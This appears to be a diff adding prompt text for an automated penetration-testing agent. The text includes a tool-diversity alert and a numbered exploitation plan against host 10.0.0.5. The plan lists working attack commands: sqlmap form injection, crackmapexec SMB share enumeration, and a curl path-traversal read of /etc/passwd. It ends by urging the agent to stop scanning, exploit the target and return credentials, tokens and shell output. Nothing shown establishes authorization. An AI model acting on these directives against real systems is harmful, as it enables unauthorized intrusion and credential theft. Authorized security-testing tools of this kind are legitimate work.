@@ -1,0 +1,26 @@
+diversity_prompt_present= True
+⚠️ TOOL DIVERSITY ALERT (iteration 3, phase=RECON):
+Tools used (2 unique): nmap(4), curl(1)
+RECOMMENDED (try these): ffuf, gobuster, nikto, nuclei, sqlmap, wfuzz
+NEXT command MUST use one of: ffuf, gobuster, nikto
+Use a different tool family or write a custom script if needed. Do not repeat failed commands verbatim.
+plan_len= 4
+🎯 PROACTIVE EXPLOITATION PLAN (based on current findings):
+Provide ONE command per response; prefer the highest-priority item.
+
+1. SQLMAP → `sqlmap -u 'http://10.0.0.5:80/' --batch --forms --crawl=2 --level=3 --risk=2`
+   Reason: Web target + SQL signal — attempt automated confirmation
+   Fallback: nuclei -u http://10.0.0.5:80 -severity critical,high
+
+2. CRACKMAPEXEC → `crackmapexec smb 10.0.0.5 --shares`
+   Reason: SMB exposed — enumerate shares and access paths
+   Fallback: smbclient -L //10.0.0.5 -N
+
+3. CURL → `curl -s 'http://10.0.0.5:80/../../../../etc/passwd' | head`
+   Reason: LFI/path traversal signal — attempt file read proof
+
+4. MSFCONSOLE → `msfconsole -q -x 'search CVE-2020-1234; exit'`
+   Reason: CVE identified (CVE-2020-1234) — check Metasploit modules quickly
+   Fallback: searchsploit CVE-2020-1234
+
+Do NOT scan again. Exploit and return real proof (data, shell output, file contents, creds/tokens).
